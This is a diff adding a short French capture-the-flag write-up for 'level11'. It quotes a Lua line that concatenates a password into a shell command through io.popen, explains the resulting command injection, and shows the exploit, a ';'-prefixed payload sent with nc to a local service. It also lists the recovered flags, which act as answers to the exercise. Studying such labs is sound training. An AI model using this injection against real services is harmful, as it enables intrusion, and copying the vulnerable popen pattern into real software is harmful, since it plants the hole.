@@ -442,6 +442,22 @@ flag: feulo4b72j7edeahuete3no7c
 
 level11 
 
+ls -la
+
+j'ai cat level11.lua
+
+```c
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+
+Problème : comme la variable pass est injectée directement dans la commande, on peut faire une injection de commande avec ;.
+
+echo '; getflag > /tmp/flag11' | nc localhost 5151
+cat /tmp/flag11
+
+flag: fa6v5ateaw21peobuub8ipe6s
+
+level12 
 
 
 
